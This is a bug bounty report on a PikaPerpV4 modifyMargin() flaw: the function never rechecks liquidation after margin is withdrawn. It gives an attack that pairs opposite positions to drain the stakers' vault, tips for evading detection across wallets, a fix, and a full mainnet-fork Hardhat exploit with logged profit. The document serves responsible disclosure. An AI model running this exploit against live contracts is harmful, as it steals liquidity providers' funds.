Found: 1 Critical
Status: Duplicated with #27365
Immunefi Id: 27763

## Bug Description
Function `modifyMargin()` in `PikaPerpV4` contract can change the position's margin and leverage. In the code we have this line:

```solidity
        if (shouldIncrease) {
            ...
        } else {
            int256 fundingPayment = PerpLib._getFundingPayment(fundingManager, position.isLong, position.productId, position.leverage, position.margin, position.funding);
            int256 pnl = PerpLib._getPnl(position.isLong, position.price, position.leverage, position.margin, IOracle(oracle).getPrice(product.productToken)) - fundingPayment;
            require (pnl > 0 || uint256(-1 * pnl) < uint256(position.margin) * liquidationThreshold / (10**4), "liquidatable");
            newMargin = uint256(position.margin) - margin;
            require(newMargin >= minMargin, "!margin");
            IERC20(token).uniTransfer(msg.sender, margin * tokenBase / BASE);
        }
```

This is basically make sure that if user want to decrease the position's margin, the current position must be above the liquidatable threshold. But the exploit here is that it doesn't check if the new margin and new leverage is above the liquidatable threshold.

Malicious user can exploit this issue by this path:

- Make 2 position in 2 opposite directions with the same margin and leverage
- If the long position is almost got liquidatable, user `modifyMargin()` the position and take out most of the funds, hence the losing fund is way significantly smaller than waiting for the position to get liquidate. Because the long postion is almost got liquidated, the short position is winning big, so user will just simply close the short postion. In the end, malicious user have more money than before. It happens the other way around
Because this strategy is always ensure the profit for malicious trader, it directly attacks the funding of stakers, as the trading profit is from staker's vault

Quote from the docs: https://docs.pikaprotocol.com/features#liquidity-vault

> The protocol is backed by the liquidity providers. By staking in the vault, liquidity providers take the opposite position of all traders on the platform. The vault pays for trader profits and receives trader losses

To avoid protocol eyes, malicious traders can use multiple wallets, create postions with a small margin each positions and dispersed the positions across multiple trading pairs. And when the time is right, malicious user can close the winning positions first, then modify margin the losing positions later.

## Impact
With enough fund and without protocol's immediate feedback during the closing out positions, almost 100% of stake fund can be taken here

## Risk Breakdown
Difficulty to Exploit: Easy Weakness: This exploit required time. But not much time tho, since the price of tokens vary a lot

## Recommendation
Make sure to check if the new margin and new leverage is liquidatable
```diff
    function modifyMargin(uint256 positionId, uint256 margin, bool shouldIncrease) external payable nonReentrant {

        // Check position
        Position storage position = positions[positionId];
        require(msg.sender == position.owner || _validateManager(position.owner), "!allow");
        Product storage product = products[uint256(position.productId)];
        uint256 newMargin;
        if (shouldIncrease) {
            IERC20(token).uniTransferFromSenderToThis(margin * tokenBase / BASE);
            newMargin = uint256(position.margin) + margin;
        } else {
-           int256 fundingPayment = PerpLib._getFundingPayment(fundingManager, position.isLong, position.productId, position.leverage, position.margin, position.funding);
-           int256 pnl = PerpLib._getPnl(position.isLong, position.price, position.leverage, position.margin, IOracle(oracle).getPrice(product.productToken)) - fundingPayment;
-           require (pnl > 0 || uint256(-1 * pnl) < uint256(position.margin) * liquidationThreshold / (10**4), "liquidatable");
            newMargin = uint256(position.margin) - margin;
            require(newMargin >= minMargin, "!margin");
            IERC20(token).uniTransfer(msg.sender, margin * tokenBase / BASE);
        }

        // New position params
        uint256 newLeverage = uint256(position.leverage) * uint256(position.margin) / newMargin;
        require(newLeverage >= BASE / 2 && newLeverage <= uint256(product.maxLeverage), "!lev");

        position.margin = uint128(newMargin);
        position.leverage = uint64(newLeverage);

+       int256 fundingPayment = PerpLib._getFundingPayment(fundingManager, position.isLong, position.productId, position.leverage, position.margin, position.funding);
+       int256 pnl = PerpLib._getPnl(position.isLong, position.price, position.leverage, position.margin, IOracle(oracle).getPrice(product.productToken)) - fundingPayment;
+       require (pnl > 0 || uint256(-1 * pnl) < uint256(position.margin) * liquidationThreshold / (10**4), "liquidatable");


        emit ModifyMargin(
            positionId,
            msg.sender,
            position.owner,
            margin,
            newMargin,
            newLeverage,
            shouldIncrease
        );

    }
```
## References
https://github.com/PikaProtocol/PikaPerpV4/blob/63a4ca227ee144d39f07bfd647670bf001136840/contracts/perp/PikaPerpV4.sol#L381C1-L391C10

## Proof of Concept
```solidity
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { time } = require("@openzeppelin/test-helpers");
const helpers = require("@nomicfoundation/hardhat-toolbox/network-helpers");

describe("EsPika", function () {
  beforeEach(async function () {
    BASE = 100_000_000;
    MIN_FEE = "200000000000000";
    THREE_DAY = 3 * 24 * 60 * 60;

    await helpers.reset(
      "https://opt-mainnet.g.alchemy.com/v2/xRbeISxw8egSDa19feCGpPRTEV5KYvBz",
      114775751
    );
    [acc1, acc2] = await ethers.getSigners();

    

    pikaPerpV4 = await ethers.getContractAt(
      "PikaPerpV4",
      "0x9b86B2Be8eDB2958089E522Fe0eB7dD5935975AB"
    );

    orderBook = await ethers.getContractAt(
      "OrderBook",
      "0x835a179a9E1A57f15823eFc82bC460Eb2D9d2E7C"
    );

    priceFeed = await ethers.getContractAt(
      "PikaPriceFeedPyth",
      "0x2A3c0592dCb58accD346cCEE2bB46e3fB744987a"
    );

    usdc = await ethers.getContractAt(
      "TestUSDC",
      "0x7f5c764cbc14f9669b88837ca1490cca17c31607"
    );

    const MockOracle = await ethers.getContractFactory("MockOracle");
    mockOracle = await MockOracle.deploy();

    const MockPerp = await ethers.getContractFactory("Perp");
    mockPerp = await MockPerp.deploy();

    orderBookExecutorAddress = "0xa66d4fb43443b2f145690f6f345c02cc8d0016a0";
    await helpers.impersonateAccount(orderBookExecutorAddress);
    orderBookExecutor = await ethers.getSigner(orderBookExecutorAddress);

    maliciousUserAddress = "0xacD03D601e5bB1B275Bb94076fF46ED9D753435A"; //just a account that has lots of USDC and ETH to test
    await helpers.impersonateAccount(maliciousUserAddress);
    maliciousUser = await ethers.getSigner(maliciousUserAddress);

    protocolOwnerAddress = "0xecFD15165d994C2766FBE0d6baCDc2E8DedFd210";
    await helpers.impersonateAccount(protocolOwnerAddress);
    protocolOwner = await ethers.getSigner(protocolOwnerAddress);

    liquidatorAddrress = "0x133FA49A01801264fC05A12EF5ef9Db6a302e93D";
    await helpers.impersonateAccount(liquidatorAddrress);
    liquidator = await ethers.getSigner(liquidatorAddrress);

    //send eth to owner
    await maliciousUser.sendTransaction({
      to: protocolOwner.address,
      value: ethers.utils.parseUnits("100", "ether"),
    });

    //approve
    await usdc
      .connect(maliciousUser)
      .approve(
        orderBook.address,
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      );

    //change oracle to mock for easy testing
    await orderBook.connect(protocolOwner).setOracle(mockOracle.address);
    await pikaPerpV4
      .connect(protocolOwner)
      .setAddresses(
        mockOracle.address,
        "0xe3451b170806Aab3e24b5Cd03a331C1CCdb4d7C1",
        "0xd851C6cBA7E3438f6d548851b5C3c254fE68D2c0"
      );

    //set liquidator
    await pikaPerpV4
      .connect(protocolOwner)
      .setLiquidator(liquidator.address, true);

    // set the mock price as the same as the pyth price
    initialPrice = (
      await priceFeed.getPriceAndStaleness(
        "0x13e3Ee699D1909E989722E753853AE30b17e08c5"
      )
    )[0]; // the price is "254698000000"

    await mockOracle.connect(protocolOwner).setPrice(initialPrice);
      
    console.log("--------------------------------------")
    console.log("Initial price: ", initialPrice.toNumber() / BASE, "ETH/USDC");

    //validate manager
    await pikaPerpV4
      .connect(maliciousUser)
      .setAccountManager(orderBook.address, true);

    FEE_RECEIVER_ADRESS = "0x0000000000000000000000000000000000000000";
  });

  describe("Test", async function () {
    it("1. User normal: 800 USDC margin, x10 leverage", async function () {
      price = "234100000000";

      balanceUserBefore = await usdc.balanceOf(maliciousUser.address);
      await orderBook
        .connect(maliciousUser)
        .createOpenOrder(
          maliciousUser.address,
          1,
          800 * BASE,
          10 * BASE,
          true,
          initialPrice,
          true,
          20000,
          { value: MIN_FEE }
        );
      // the positionId is: 0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a

      await orderBook
        .connect(orderBookExecutor)
        .executeOpenOrder(maliciousUser.address, "0", FEE_RECEIVER_ADRESS);

      await time.increase(THREE_DAY);

      await mockOracle.setPrice(price); //price: 2341 -> can liquidate

      await pikaPerpV4
        .connect(liquidator)
        .liquidatePositions([
          "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
        ]);

      balanceUserAfter = await usdc.balanceOf(maliciousUser.address);
      console.log(
        "Losing: ",
        (balanceUserBefore - balanceUserAfter) / 1_000_000,
        "USDC; Liquidate price: ",
        price / BASE,
        "ETH/USDC"
      ); //losing 804 usdc
    });

    it("2. User normal: 160 USDC margin, x50 leverage", async function () {
      price = "250200000000";

      balanceUserBefore = await usdc.balanceOf(maliciousUser.address);
      await orderBook
        .connect(maliciousUser)
        .createOpenOrder(
          maliciousUser.address,
          1,
          160 * BASE,
          50 * BASE,
          true,
          initialPrice,
          true,
          20000,
          { value: MIN_FEE }
        );
      // the positionId is: 0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a

      await orderBook
        .connect(orderBookExecutor)
        .executeOpenOrder(maliciousUser.address, "0", FEE_RECEIVER_ADRESS);

      await time.increase(THREE_DAY);

      await mockOracle.setPrice(price); //price: 2502 -> can liquidate

      await pikaPerpV4
        .connect(liquidator)
        .liquidatePositions([
          "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
        ]);

      balanceUserAfter = await usdc.balanceOf(maliciousUser.address);
      console.log(
        "Losing: ",
        (balanceUserBefore - balanceUserAfter) / 1_000_000,
        "USDC; Liquidate price: ",
        price / BASE,
        "ETH/USDC"
      );
    });

    it("3. User malicious modifyMargin(): 800 USDC margin, x10 leverage -> 160 USDC margin, x50 leverage", async function () {
      /* Attack path:
      - User create a long position with 800 USDC margin, x10 leverage when the price is 2546 USDC/ETH
      - When the position almost get below the threshold to get liquidatable, user modifyMargin() to 160 USDC margin, x50 leverage
      */
      price = "234400000000";
      balanceUserBefore = await usdc.balanceOf(maliciousUser.address);
      await orderBook
        .connect(maliciousUser)
        .createOpenOrder(
          maliciousUser.address,
          1,
          800 * BASE,
          10 * BASE,
          true,
          initialPrice,
          true,
          20000,
          { value: MIN_FEE }
        );
      // the positionId is: 0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a

      await orderBook
        .connect(orderBookExecutor)
        .executeOpenOrder(maliciousUser.address, "0", FEE_RECEIVER_ADRESS);

      await time.increase(THREE_DAY);

      await mockOracle.setPrice(price); //price: 2342 -> can ALMOST liquidate

      await expect(
        pikaPerpV4
          .connect(liquidator)
          .liquidatePositions([
            "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
          ])
      ).to.be.reverted; //this get reverted -> proof that liquidator can ALMOST liquidate

      //in that time, malicious user can modify margin, from 800 USDC margin, x10 leverage -> 160 USDC margin, x50 leverage
      await pikaPerpV4
        .connect(maliciousUser)
        .modifyMargin(
          "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
          (800 - 160) * BASE,
          false
        );

      balanceUserAfter = await usdc.balanceOf(maliciousUser.address);
      console.log(
        "Losing: ",
        (balanceUserBefore - balanceUserAfter) / 1_000_000,
        "USDC; Liquidate price: ",
        price / BASE,
        "ETH/USDC"
      );
    });

    it("4. User malicious 2 opposite equal-value position: 1 long, 1 short. Long get liquidated so malicious user modifyMargin() like test#3", async function () {
      price = "234400000000";
      balanceUserBefore = await usdc.balanceOf(maliciousUser.address);
      longId =
        "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a";
      shortId =
        "0x13019e1c126a895d6796e0dccb4c5bc7f9b3cd7a064dc85a0460534309b03f6e";

      //make a long position
      await orderBook
        .connect(maliciousUser)
        .createOpenOrder(
          maliciousUser.address,
          1,
          800 * BASE,
          10 * BASE,
          true,
          initialPrice,
          true,
          20000,
          { value: MIN_FEE }
        );
      // the positionId is: 0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a

      //execute long position
      await orderBook
        .connect(orderBookExecutor)
        .executeOpenOrder(maliciousUser.address, "0", FEE_RECEIVER_ADRESS);

      //make a short position
      await orderBook
        .connect(maliciousUser)
        .createOpenOrder(
          maliciousUser.address,
          1,
          800 * BASE,
          10 * BASE,
          false,
          initialPrice,
          true,
          20000,
          { value: MIN_FEE }
        );
      // the positionId is: 0x13019e1c126a895d6796e0dccb4c5bc7f9b3cd7a064dc85a0460534309b03f6e

      //execute short position
      await orderBook
        .connect(orderBookExecutor)
        .executeOpenOrder(maliciousUser.address, "1", FEE_RECEIVER_ADRESS);

      await time.increase(THREE_DAY);

      await mockOracle.setPrice(price); //price: 2342 -> can ALMOST liquidate

      await expect(
        pikaPerpV4
          .connect(liquidator)
          .liquidatePositions([
            "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
          ])
      ).to.be.reverted; //this get reverted -> proof that liquidator can ALMOST liquidate

      //in that time, malicious user can modify margin, from 800 USDC margin, x10 leverage -> 160 USDC margin, x50 leverage
      await pikaPerpV4
        .connect(maliciousUser)
        .modifyMargin(
          "0x9209acd301a8fd5c34d51bec1e08465223101edb5a2b0506a9f9a27dde3b549a",
          (800 - 160) * BASE,
          false
        );

      // then, malicious close short one that's winning
      await orderBook
        .connect(maliciousUser)
        .createCloseOrder(
          maliciousUser.address,
          "1",
          800 * 10 * BASE,
          false,
          price,
          true,
          { value: MIN_FEE }
        );

      await orderBook
        .connect(orderBookExecutor)
        .executeCloseOrder(maliciousUser.address, "0", FEE_RECEIVER_ADRESS);

      balanceUserAfter = await usdc.balanceOf(maliciousUser.address);
      console.log(
        "Profiting: ",
        (balanceUserAfter - balanceUserBefore) / 1_000_000,
        "USDC; Liquidate price: ",
        price / BASE,
        "ETH/USDC"
      );
    });
  });
});
```

Logs:
```
--------------------------------------
Initial price:  2546.98 ETH/USDC
Losing:  804 USDC; Liquidate price:  2341 ETH/USDC
      ✔ 1. User normal: 800 USDC margin, x10 leverage (119ms)
--------------------------------------
Initial price:  2546.98 ETH/USDC
Losing:  164 USDC; Liquidate price:  2502 ETH/USDC
      ✔ 2. User normal: 160 USDC margin, x50 leverage (99ms)
--------------------------------------
Initial price:  2546.98 ETH/USDC
Losing:  164 USDC; Liquidate price:  2344 ETH/USDC
      ✔ 3. User malicious modifyMargin(): 800 USDC margin, x10 leverage -> 160 USDC margin, x50 leverage (131ms)
--------------------------------------
Initial price:  2546.98 ETH/USDC
Profiting:  456.129008 USDC; Liquidate price:  2344 ETH/USDC
      ✔ 4. User malicious 2 opposite equal-value position: 1 long, 1 short. Long get liquidated so malicious user modifyMargin() like test#3 (210ms)
```